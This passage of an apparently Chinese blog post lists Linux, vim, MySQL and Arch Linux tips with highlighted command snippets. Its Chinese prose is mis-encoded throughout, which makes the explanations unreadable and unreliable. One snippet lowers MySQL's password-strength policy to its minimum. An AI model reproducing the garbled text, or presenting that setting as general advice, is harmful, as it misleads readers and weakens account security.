æ›¿æ¢ç¬¬Â nÂ è¡Œå¼€å§‹åˆ°æœ€åä¸€è¡Œä¸­æ¯ä¸€è¡Œçš„ç¬¬ä¸€ä¸ªÂ wellÂ ä¸ºÂ good</span><br><span class="line"></span><br><span class="line">:n,$s/well/good/gÂ Â Â Â Â æ›¿æ¢ç¬¬Â nÂ è¡Œå¼€å§‹åˆ°æœ€åä¸€è¡Œä¸­æ¯ä¸€è¡Œæ‰€æœ‰Â wellÂ ä¸ºÂ good</span><br><span class="line"></span><br><span class="line">n ä¸ºæ•°å­—ï¼Œè‹¥ n ä¸º .ï¼Œè¡¨ç¤ºä»å½“å‰è¡Œå¼€å§‹åˆ°æœ€åä¸€è¡Œ</span><br><span class="line"></span><br><span class="line">:%s/well/good/Â Â Â Â Â Â ï¼ˆç­‰åŒäºÂ :g/well/s//good/ï¼‰Â æ›¿æ¢æ¯ä¸€è¡Œçš„ç¬¬ä¸€ä¸ªÂ wellÂ ä¸ºÂ good</span><br><span class="line"></span><br><span class="line">:%s/well/good/gÂ Â Â Â ï¼ˆç­‰åŒäºÂ :g/well/s//good/gï¼‰Â æ›¿æ¢æ¯ä¸€è¡Œä¸­æ‰€æœ‰Â wellÂ ä¸ºÂ good</span><br><span class="line"></span><br><span class="line">ç‰¹æ®Šç¬¦å·è½¬ä¹‰ï¼šå¯ä»¥ä½¿ç”¨#ä½œä¸ºåˆ†éš”ç¬¦ï¼Œæ­¤æ—¶ä¸­é—´å‡ºç°çš„ / ä¸ä¼šä½œä¸ºåˆ†éš”ç¬¦</span><br><span class="line"></span><br><span class="line">:s#well/#good/#Â Â Â Â Â ã€€ã€€ã€€æ›¿æ¢å½“å‰è¡Œç¬¬ä¸€ä¸ªÂ well/Â ä¸ºÂ good/</span><br><span class="line"></span><br><span class="line">:%s#/usr/bin#/bin#g å¯ä»¥æŠŠæ–‡ä»¶ä¸­æ‰€æœ‰è·¯å¾„/usr/binæ¢æˆ/bin</span><br></pre></td></tr></table></figure></li><li><p>vim ä¹±ç é—®é¢˜<br>å…¶ä¸­-bä¸€èˆ¬æ˜¯ç”¨æ¥æŸ¥çœ‹å¯¹åº”çš„äºŒè¿›åˆ¶æ–‡ä»¶</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">vim</span> -<span class="keyword">b</span> <span class="keyword">file</span></span><br></pre></td></tr></table></figure></li><li><p>vim tab è®¾ç½®ä¸º4ä¸ªç©ºæ ¼<br>vimrcæ–‡ä»¶æœ«å°¾åŠ ä¸Š</p></li></ul><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">set</span> <span class="keyword">ts</span>=<span class="number">4</span></span><br><span class="line"><span class="keyword">set</span> expandtab</span><br><span class="line"><span class="keyword">set</span> autoindent</span><br></pre></td></tr></table></figure><ul><li><p>vim å¤šè¡Œæ³¨é‡Š</p><ul><li>é¦–å…ˆæŒ‰ esc è¿›å…¥å‘½ä»¤è¡Œæ¨¡å¼ä¸‹ï¼ŒæŒ‰ä¸‹ Ctrl + vï¼Œè¿›å…¥åˆ—ï¼ˆä¹Ÿå«åŒºå—ï¼‰æ¨¡å¼;</li><li>åœ¨è¡Œé¦–ä½¿ç”¨ä¸Šä¸‹é”®é€‰æ‹©éœ€è¦æ³¨é‡Šçš„å¤šè¡Œ;</li><li>æŒ‰ä¸‹é”®ç›˜ï¼ˆå¤§å†™ï¼‰â€œIâ€ é”®ï¼Œè¿›å…¥æ’å…¥æ¨¡å¼ï¼›</li><li>ç„¶åè¾“å…¥æ³¨é‡Šç¬¦ï¼ˆâ€œ//â€ã€â€œ#â€ç­‰ï¼‰;</li><li>æœ€åæŒ‰ä¸‹ â€œEscâ€ é”®ã€‚ æ³¨ï¼šåœ¨æŒ‰ä¸‹escé”®åï¼Œä¼šç¨ç­‰ä¸€ä¼šæ‰ä¼šå‡ºç°æ³¨é‡Šï¼Œä¸è¦ç€æ€¥æ—¶é—´å¾ˆçŸ­çš„~</li></ul></li><li><p>vim å»æ‰é«˜äº®åº•è‰²<br>è¿›å…¥å‘½ä»¤æ¨¡å¼, è¾“å…¥</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">:nohl</span><br></pre></td></tr></table></figure></li><li><p>vim é™¤äº† i o å¤–çš„å…¶ä»–æ’å…¥</p><ul><li>I åœ¨å…‰æ ‡å½“å‰è¡Œå¼€å§‹æ’å…¥</li><li>a åœ¨å…‰æ ‡åæ’å…¥</li><li>A åœ¨å…‰æ ‡å½“å‰è¡Œæœ«å°¾æ’å…¥</li><li>O åœ¨å…‰æ ‡å½“å‰è¡Œçš„ä¸Šä¸€è¡Œæ’å…¥æ–°è¡Œ</li></ul></li><li><p>vim å®šä½å‘½ä»¤</p><ul><li>:set nu æ˜¾ç¤ºè¡Œå·</li><li>:set nonu å–æ¶ˆè¡Œå·</li></ul></li><li><p>vim æ›¿æ¢å’Œå–æ¶ˆå‘½ä»¤</p><ul><li>r æ›¿æ¢å…‰æ ‡æ‰€åœ¨å¤„çš„å­—ç¬¦</li><li>R ä»å…‰æ ‡æ‰€åœ¨å¤„å¼€å§‹æ›¿æ¢,æŒ‰Escé”®ç»“æŸ</li></ul></li><li><p>vim åˆ é™¤å‘½ä»¤(ä¸€ç›´å‚»å‚»çš„æŒ‰è¿œè¿œçš„delé”®..)</p><ul><li>x åˆ é™¤å…‰æ ‡æ‰€åœ¨å¤„å‘½ä»¤</li><li>nx åˆ é™¤å…‰æ ‡æ‰€åœ¨å¤„åçš„nä¸ªå­—ç¬¦</li><li>dG åˆ é™¤å…‰æ ‡æ‰€åœ¨è¡Œåˆ°æœ«å°¾è¡Œçš„æ‰€æœ‰å†…å®¹</li><li>D åˆ é™¤å…‰æ ‡æ‰€åœ¨å¤„åˆ°è¡Œå°¾çš„å†…å®¹</li><li>:n,md åˆ é™¤åˆ¶å®šèŒƒå›´çš„è¡Œ</li></ul></li><li><p>vim å¸¸ç”¨å¿«æ·é”®</p><ul><li>Shift + zz ä¿å­˜é€€å‡º, ä¸ â€œ:wqâ€ ä½œç”¨ç›¸åŒ</li><li>V è¿›å…¥è¡Œå¯è§†æ¨¡å¼</li><li>Ctrl + v è¿›å…¥å—å¯è§†æ¨¡å¼</li></ul></li><li><p>vim é¼ æ ‡å³é”®ä¸èƒ½å¤åˆ¶ç²˜è´´ï¼Œè€Œæ˜¯åˆ‡ä¸ºå¯è§†åŒ–æ¨¡å¼</p><ul><li>å…¨å±€æ”¹å˜ vim /etc/vimrc</li><li>ä»…æ”¹å˜å½“å‰ç”¨æˆ· vim ~/.vimrc </li><li>æ³¨æ„äº‹é¡¹: source è¿™ä¸€è¡Œçš„åŠŸèƒ½æ˜¯åŠ è½½é»˜è®¤é…ç½®ï¼Œä¸€å®šè¦å…ˆç¡®å®šè¯¥æ–‡ä»¶è·¯å¾„å­˜åœ¨ (æ ¹æ®vimç‰ˆæœ¬ç¡®å®vim7*,8*)ï¼Œå¦åˆ™å¯èƒ½ä¼šå¯¼è‡´ vim ä¸å¯ç”¨<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">source</span> /usr/share/vim/vim81/defaults.vim</span><br><span class="line"><span class="built_in">let</span> skip_defaults_vim = 1</span><br><span class="line"><span class="keyword">if</span> has(<span class="string">&#x27;mouse&#x27;</span>)</span><br><span class="line">    <span class="built_in">set</span> mouse-=a</span><br><span class="line">endif</span><br></pre></td></tr></table></figure></li><li>é‡æ–°æ‰“å¼€ vim å°±å¯ä»¥æ­£å¸¸ä½¿ç”¨é¼ æ ‡å³é”®å¤åˆ¶ç²˜è´´äº†</li><li>è½¬è½½è‡ª: <a href="https://xirikm.net/2019/504-1.html">https://xirikm.net/2019/504-1.html</a></li></ul></li></ul><h4 id="å…«ã€linuxç»ˆç«¯é”å±ä¸è§£é”"><a href="#å…«ã€linuxç»ˆç«¯é”å±ä¸è§£é”" class="headerlink" title="å…«ã€linuxç»ˆç«¯é”å±ä¸è§£é”"></a>å…«ã€linuxç»ˆç«¯é”å±ä¸è§£é”</h4><p>ctrl+s é”å±<br>ctrl+q è§£é”</p><h4 id="ä¹ã€Sublime-Text-3-å‚ç›´é€‰å–"><a href="#ä¹ã€Sublime-Text-3-å‚ç›´é€‰å–" class="headerlink" title="ä¹ã€Sublime Text 3 å‚ç›´é€‰å–"></a>ä¹ã€Sublime Text 3 å‚ç›´é€‰å–</h4><p>Shift+é¼ æ ‡å³é”®</p><h4 id="åã€MySQLç»Ÿè®¡æ‰€ä»¥åº“æ•°æ®å¤§å°ï¼ˆæœ‰ç‚¹æ…¢å–”ï¼‰"><a href="#åã€MySQLç»Ÿè®¡æ‰€ä»¥åº“æ•°æ®å¤§å°ï¼ˆæœ‰ç‚¹æ…¢å–”ï¼‰" class="headerlink" title="åã€MySQLç»Ÿè®¡æ‰€ä»¥åº“æ•°æ®å¤§å°ï¼ˆæœ‰ç‚¹æ…¢å–”ï¼‰"></a>åã€MySQLç»Ÿè®¡æ‰€ä»¥åº“æ•°æ®å¤§å°ï¼ˆæœ‰ç‚¹æ…¢å–”ï¼‰</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">SELECT TABLE_SCHEMA, concat(TRUNCATE(sum(data_length)/1024/1024,2),<span class="string">&#x27;MB&#x27;</span>) AS data_size,</span><br><span class="line">concat(TRUNCATE(sum(index_length)/1024/1024,2),<span class="string">&#x27;MB&#x27;</span>) AS index_size</span><br><span class="line">FROM information_schema.TABLES</span><br><span class="line">GROUP BY TABLE_SCHEMA</span><br><span class="line">ORDER BY data_length DESC;</span><br></pre></td></tr></table></figure><h4 id="åä¸€ã€ç”¨æˆ·åŠ ç»„"><a href="#åä¸€ã€ç”¨æˆ·åŠ ç»„" class="headerlink" title="åä¸€ã€ç”¨æˆ·åŠ ç»„"></a>åä¸€ã€ç”¨æˆ·åŠ ç»„</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">usermod -aG group user</span><br></pre></td></tr></table></figure><h4 id="åäºŒã€æ¢æµ‹æœåŠ¡æ˜¯å¦å·²ç»å¯åŠ¨-è¿è¡Œæ˜¯å¦æ­£å¸¸"><a href="#åäºŒã€æ¢æµ‹æœåŠ¡æ˜¯å¦å·²ç»å¯åŠ¨-è¿è¡Œæ˜¯å¦æ­£å¸¸" class="headerlink" title="åäºŒã€æ¢æµ‹æœåŠ¡æ˜¯å¦å·²ç»å¯åŠ¨, è¿è¡Œæ˜¯å¦æ­£å¸¸"></a>åäºŒã€æ¢æµ‹æœåŠ¡æ˜¯å¦å·²ç»å¯åŠ¨, è¿è¡Œæ˜¯å¦æ­£å¸¸</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">killall -0 service</span><br></pre></td></tr></table></figure><h4 id="åä¸‰ã€deb-å’Œ-rpm-åŒ…ä¹‹é—´çš„è½¬æ¢"><a href="#åä¸‰ã€deb-å’Œ-rpm-åŒ…ä¹‹é—´çš„è½¬æ¢" class="headerlink" title="åä¸‰ã€deb å’Œ rpm åŒ…ä¹‹é—´çš„è½¬æ¢"></a>åä¸‰ã€deb å’Œ rpm åŒ…ä¹‹é—´çš„è½¬æ¢</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install alien</span><br></pre></td></tr></table></figure><h4 id="åå››ã€æŸ¥çœ‹è‡ªå·±çš„-pts"><a href="#åå››ã€æŸ¥çœ‹è‡ªå·±çš„-pts" class="headerlink" title="åå››ã€æŸ¥çœ‹è‡ªå·±çš„ pts"></a>åå››ã€æŸ¥çœ‹è‡ªå·±çš„ pts</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">who am i</span><br></pre></td></tr></table></figure><h4 id="åäº”ã€åˆ›å»ºç›®å½•ç»“æ„"><a href="#åäº”ã€åˆ›å»ºç›®å½•ç»“æ„" class="headerlink" title="åäº”ã€åˆ›å»ºç›®å½•ç»“æ„"></a>åäº”ã€åˆ›å»ºç›®å½•ç»“æ„</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -v æ˜¾ç¤ºåšäº†ä»€ä¹ˆ</span></span><br><span class="line">mkdir -pv path/&#123;dir1, dir2, ...&#125;</span><br></pre></td></tr></table></figure><h4 id="åå…­ã€æŸ¥çœ‹-nginx-çš„ç»„å’Œç”¨æˆ·å¹¶é”å®šå…¶ä¸èƒ½ç”¨-ssh-ç™»å½•"><a href="#åå…­ã€æŸ¥çœ‹-nginx-çš„ç»„å’Œç”¨æˆ·å¹¶é”å®šå…¶ä¸èƒ½ç”¨-ssh-ç™»å½•" class="headerlink" title="åå…­ã€æŸ¥çœ‹ nginx çš„ç»„å’Œç”¨æˆ·å¹¶é”å®šå…¶ä¸èƒ½ç”¨ ssh ç™»å½•"></a>åå…­ã€æŸ¥çœ‹ nginx çš„ç»„å’Œç”¨æˆ·å¹¶é”å®šå…¶ä¸èƒ½ç”¨ ssh ç™»å½•</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># æŸ¥çœ‹ç»„</span></span><br><span class="line">getent group nginx</span><br><span class="line"><span class="comment"># æŸ¥çœ‹ç”¨æˆ·</span></span><br><span class="line">getent passwd nginx</span><br><span class="line"><span class="comment"># æŸ¥çœ‹nginxå±äºå“ªä¸ªç»„</span></span><br><span class="line">id nginx</span><br><span class="line"><span class="comment"># é”å®š nginx ä¸èƒ½ç™»å½•</span></span><br><span class="line">usermod -s /sbin/nologin nginx</span><br></pre></td></tr></table></figure><h4 id="åä¸ƒã€é”å®šnginxç”¨æˆ·ä¸èƒ½ç™»å½•"><a href="#åä¸ƒã€é”å®šnginxç”¨æˆ·ä¸èƒ½ç™»å½•" class="headerlink" title="åä¸ƒã€é”å®šnginxç”¨æˆ·ä¸èƒ½ç™»å½•"></a>åä¸ƒã€é”å®šnginxç”¨æˆ·ä¸èƒ½ç™»å½•</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">passwd -l </span><br></pre></td></tr></table></figure><h4 id="åå…«ã€mysqlå¯†ç å¼ºåº¦è®¾ç½®"><a href="#åå…«ã€mysqlå¯†ç å¼ºåº¦è®¾ç½®" class="headerlink" title="åå…«ã€mysqlå¯†ç å¼ºåº¦è®¾ç½®"></a>åå…«ã€mysqlå¯†ç å¼ºåº¦è®¾ç½®</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; <span class="built_in">set</span> global validate_password_policy=0;</span><br><span class="line">mysql&gt; <span class="built_in">set</span> global validate_password_length=1;</span><br><span class="line"><span class="comment"># è®¾ç½® root&#x27;@&#x27;localhost çš„å¯†ç </span></span><br><span class="line">ALTER USER <span class="string">&#x27;root&#x27;</span>@<span class="string">&#x27;localhost&#x27;</span> IDENTIFIED BY <span class="string">&#x27;new password&#x27;</span>;</span><br></pre></td></tr></table></figure><h4 id="åä¹ã€MySQLæŸ¥çœ‹æ‰€æœ‰è¿æ¥çš„å®¢æˆ·ç«¯ip"><a href="#åä¹ã€MySQLæŸ¥çœ‹æ‰€æœ‰è¿æ¥çš„å®¢æˆ·ç«¯ip" class="headerlink" title="åä¹ã€MySQLæŸ¥çœ‹æ‰€æœ‰è¿æ¥çš„å®¢æˆ·ç«¯ip"></a>åä¹ã€MySQLæŸ¥çœ‹æ‰€æœ‰è¿æ¥çš„å®¢æˆ·ç«¯ip</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">SELECT user, host from mysql.user;</span><br><span class="line"><span class="comment"># æˆ–è€…</span></span><br><span class="line">SELECT</span><br><span class="line">substring_index(HOST, <span class="string">&#x27;:&#x27;</span>, 1) AS host_name,</span><br><span class="line">state,</span><br><span class="line">count(*)</span><br><span class="line">FROM</span><br><span class="line">information_schema. PROCESSLIST</span><br><span class="line">GROUP BY</span><br><span class="line">state,</span><br><span class="line">host_name;</span><br></pre></td></tr></table></figure><h4 id="äºŒåã€ç¼–ç è½¬æ¢"><a href="#äºŒåã€ç¼–ç è½¬æ¢" class="headerlink" title="äºŒåã€ç¼–ç è½¬æ¢"></a>äºŒåã€ç¼–ç è½¬æ¢</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># åœ¨ linux ä¸‹æ‰“å¼€ windows çš„ txt å¯èƒ½ä¹±ç </span></span><br><span class="line">iconv -f GBK -t UTF-8 æ–‡ä»¶åå­—</span><br><span class="line"><span class="comment"># gedit ä¹±ç å¯å°è¯•</span></span><br><span class="line">gsettings <span class="built_in">set</span> org.gnome.gedit.preferences.encodings candidate-encodings <span class="string">&quot;[&#x27;GB18030&#x27;, &#x27;UTF-8&#x27;, &#x27;CURRENT&#x27;, &#x27;ISO-8859-15&#x27;, &#x27;UTF-16&#x27;]&quot;</span></span><br></pre></td></tr></table></figure><h4 id="äºŒåä¸€ã€æ‰¹é‡å›¾ç‰‡å¤§å°è½¬æ¢"><a href="#äºŒåä¸€ã€æ‰¹é‡å›¾ç‰‡å¤§å°è½¬æ¢" class="headerlink" title="äºŒåä¸€ã€æ‰¹é‡å›¾ç‰‡å¤§å°è½¬æ¢"></a>äºŒåä¸€ã€æ‰¹é‡å›¾ç‰‡å¤§å°è½¬æ¢</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find ./ -name <span class="string">&#x27;*.jpg&#x27;</span> -<span class="built_in">exec</span> convert -resize 1100x2200 &#123;&#125; &#123;&#125; \;</span><br></pre></td></tr></table></figure><h4 id="äºŒåä¸€ã€äº”-å¼„ä¸€ä¸ªè¯»å–é€Ÿåº¦å¾ˆå¿«å¾ˆå¿«çš„å°ç¡¬ç›˜"><a href="#äºŒåä¸€ã€äº”-å¼„ä¸€ä¸ªè¯»å–é€Ÿåº¦å¾ˆå¿«å¾ˆå¿«çš„å°ç¡¬ç›˜" class="headerlink" title="äºŒåä¸€ã€äº” å¼„ä¸€ä¸ªè¯»å–é€Ÿåº¦å¾ˆå¿«å¾ˆå¿«çš„å°ç¡¬ç›˜"></a>äºŒåä¸€ã€äº” å¼„ä¸€ä¸ªè¯»å–é€Ÿåº¦å¾ˆå¿«å¾ˆå¿«çš„å°ç¡¬ç›˜</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mkdir -p /mnt/ram</span><br><span class="line">mount -t tmpfs tmpfs /mnt/ram -o size=8192M</span><br></pre></td></tr></table></figure><h4 id="äºŒåäºŒã€donâ€™t-add-command-to-history-note-the-leading-space"><a href="#äºŒåäºŒã€donâ€™t-add-command-to-history-note-the-leading-space" class="headerlink" title="äºŒåäºŒã€donâ€™t add command to history (note the leading space)"></a>äºŒåäºŒã€donâ€™t add command to history (note the leading space)</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;Am I like a hacker?&quot;</span><br></pre></td></tr></table></figure><h4 id="äºŒåä¸‰ã€exit-terminal-but-leave-all-processes-running"><a href="#äºŒåä¸‰ã€exit-terminal-but-leave-all-processes-running" class="headerlink" title="äºŒåä¸‰ã€exit terminal but leave all processes running"></a>äºŒåä¸‰ã€exit terminal but leave all processes running</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">disown</span> -a &amp;&amp; <span class="built_in">exit</span></span><br></pre></td></tr></table></figure><h4 id="äºŒåå››ã€script-å›æ”¾"><a href="#äºŒåå››ã€script-å›æ”¾" class="headerlink" title="äºŒåå››ã€script å›æ”¾"></a>äºŒåå››ã€script å›æ”¾</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># å¼€å§‹å½•åƒï¼Œctrl+dæˆ–è€…exitç»“æŸ</span></span><br><span class="line">script -t 2&gt;demo.time -a demo.his</span><br><span class="line"><span class="comment"># å›æ”¾</span></span><br><span class="line">scriptreplay demo.time demo.his</span><br></pre></td></tr></table></figure><h4 id="äºŒåäº”ã€-æœç´¢å†å²è®°å½•"><a href="#äºŒåäº”ã€-æœç´¢å†å²è®°å½•" class="headerlink" title="äºŒåäº”ã€ æœç´¢å†å²è®°å½•"></a>äºŒåäº”ã€ æœç´¢å†å²è®°å½•</h4><p>ctrl + r<br>æˆ‘å¤©ï¼Œè¿™ä¹ˆå¥½ç”¨çš„å‘½ä»¤æˆ‘å±…ç„¶ä¸€ç›´å¾ˆå°‘ç”¨ã€‚ã€‚ã€‚</p><h4 id="äºŒåå…­ã€-V2ray"><a href="#äºŒåå…­ã€-V2ray" class="headerlink" title="äºŒåå…­ã€ V2ray"></a>äºŒåå…­ã€ V2ray</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ç³»ç»Ÿæ—¶é—´</span></span><br><span class="line">sudo date -s 2019/10/27</span><br><span class="line">sudo date -s 16:36:10</span><br><span class="line"><span class="comment"># æˆ–</span></span><br><span class="line">sudo pacman -S openntpd</span><br><span class="line">sudo systemctl <span class="built_in">enable</span> openntpd</span><br><span class="line">sudo systemctl start openntpd</span><br></pre></td></tr></table></figure><h4 id="äºŒåä¸ƒã€archlinux-vmware"><a href="#äºŒåä¸ƒã€archlinux-vmware" class="headerlink" title="äºŒåä¸ƒã€archlinux vmware"></a>äºŒåä¸ƒã€archlinux vmware</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># æ¯æ¬¡æ›´æ–°å®Œå†…æ ¸éƒ½è¦ä½¿ç”¨å¦‚ä¸‹å‘½ä»¤é‡æ–°ç¼–è¯‘å†…æ ¸æ¨¡å—çš„</span></span><br><span class="line">sudo vmware-modconfig --console --install-all</span><br></pre></td></tr></table></figure><h4 id="äºŒåå…«ã€linuxå†™å…¥-ntfs-æ–‡ä»¶"><a href="#äºŒåå…«ã€linuxå†™å…¥-ntfs-æ–‡ä»¶" class="headerlink" title="äºŒåå…«ã€linuxå†™å…¥ ntfs æ–‡ä»¶"></a>äºŒåå…«ã€linuxå†™å…¥ ntfs æ–‡ä»¶</h4><p>éœ€è¦å®‰è£… ntfs-3g</p><h4 id="äºŒåä¹ã€sudo-git-å¯¼è‡´rootç”¨æˆ·å’Œå…¶ä»–ç”¨æˆ·gité…ç½®ä¸ä¸€è‡´"><a href="#äºŒåä¹ã€sudo-git-å¯¼è‡´rootç”¨æˆ·å’Œå…¶ä»–ç”¨æˆ·gité…ç½®ä¸ä¸€è‡´" class="headerlink" title="äºŒåä¹ã€sudo git å¯¼è‡´rootç”¨æˆ·å’Œå…¶ä»–ç”¨æˆ·gité…ç½®ä¸ä¸€è‡´"></a>äºŒåä¹ã€sudo git å¯¼è‡´rootç”¨æˆ·å’Œå…¶ä»–ç”¨æˆ·gité…ç½®ä¸ä¸€è‡´</h4><p>sudo ä¹Ÿä¸æ˜¯ä¹±ç”¨çš„æ™•ã€‚ã€‚ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">*** Please tell me who you are.</span><br><span class="line"></span><br><span class="line">Run</span><br><span class="line"></span><br><span class="line">  git config --global user.email &quot;you@example.com&quot;</span><br><span class="line">  git config --global user.name &quot;Your Name&quot;</span><br><span class="line"></span><br><span class="line">to set your account&#39;s default identity.</span><br><span class="line">Omit --global to set the identity only in this repository.</span><br><span class="line"></span><br><span class="line">fatal: unable to auto-detect email address (got &#39;root@****.(none)&#39;)</span><br></pre></td></tr></table></figure><h4 id="ä¸‰åã€-archlinux-ä¸­ä¸€ä¸ªç½‘å¡å¤šipå¯èƒ½ä¼šå¯¼è‡´ä¸åŒæœåŠ¡ipå†²çªå¯¼è‡´ç½‘é€Ÿä¸‹é™"><a href="#ä¸‰åã€-archlinux-ä¸­ä¸€ä¸ªç½‘å¡å¤šipå¯èƒ½ä¼šå¯¼è‡´ä¸åŒæœåŠ¡ipå†²çªå¯¼è‡´ç½‘é€Ÿä¸‹é™" class="headerlink" title="ä¸‰åã€ archlinux ä¸­ä¸€ä¸ªç½‘å¡å¤šipå¯èƒ½ä¼šå¯¼è‡´ä¸åŒæœåŠ¡ipå†²çªå¯¼è‡´ç½‘é€Ÿä¸‹é™"></a>ä¸‰åã€ archlinux ä¸­ä¸€ä¸ªç½‘å¡å¤šipå¯èƒ½ä¼šå¯¼è‡´ä¸åŒæœåŠ¡ipå†²çªå¯¼è‡´ç½‘é€Ÿä¸‹é™</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># æŸ¥çœ‹ä¸€ä¸ªç½‘å¡æ˜¯å¦å­˜åœ¨å¤šä¸ªip</span></span><br><span class="line">ip addr</span><br><span class="line"></span><br><span class="line"><span class="comment"># å¦‚æœå­˜åœ¨å¤šä¸ª ip å¯èƒ½æ˜¯ç³»ç»Ÿè£…æœ‰å¤šä¸ªç½‘ç»œç®¡ç†é€ æˆçš„, æˆ‘æ˜¯æŠŠ dhcpcd å…³äº† å† é…åˆé™æ€ipå°±å¥½äº†</span></span><br><span class="line">systemctl stop dhcpcd</span><br><span class="line">systemctl <span class="built_in">disable</span> dhcpcd</span><br><span class="line"></span><br><span class="line"><span class="comment"># ç„¶åé‡å¯</span></span><br><span class="line">shutdown -r now</span><br></pre></td></tr></table></figure><h4 id="ä¸‰åä¸€ã€-linux-ä¸‹-pycharm-ç”¨-matplotlib-åº“ä¸­æ–‡ä¹±ç -åŠ-å‡å·æ–¹å—é—®é¢˜"><a href="#ä¸‰åä¸€ã€-linux-ä¸‹-pycharm-ç”¨-matplotlib-åº“ä¸­æ–‡ä¹±ç -åŠ-å‡å·æ–¹å—é—®é¢˜" class="headerlink" title="ä¸‰åä¸€ã€ linux ä¸‹ pycharm ç”¨ matplotlib åº“ä¸­æ–‡ä¹±ç  åŠ å‡å·æ–¹å—é—®é¢˜"></a>ä¸‰åä¸€ã€ linux ä¸‹ pycharm ç”¨ matplotlib åº“ä¸­æ–‡ä¹±ç  åŠ å‡å·æ–¹å—é—®é¢˜</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># æŸ¥çœ‹ matplotlib å­—ä½“åŠé…ç½®æ–‡ä»¶ç›®å½•</span></span><br><span class="line"><span class="keyword">import</span> matplotlib </span><br><span class="line">CONFIG_DIR = <span class="built_in">print</span>(matplotlib.matplotlib_fname())</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># https://fontzone.net/download/simhei ä¸‹è½½ simhei å­—ä½“</span></span><br><span class="line"><span class="comment"># æŠŠå­—ä½“æ‹·è´åˆ° matplotlib å­—ä½“ç›®å½•</span></span><br><span class="line"><span class="comment"># è¦æ³¨æ„ä½ æ–°ä¸‹è½½å­—ä½“çš„ç”¨æˆ·åŠç”¨æˆ·ç»„çš„æƒé™å’Œè¯¥ç›®å½•ä¸‹ä¸€è‡´</span></span><br><span class="line">cp 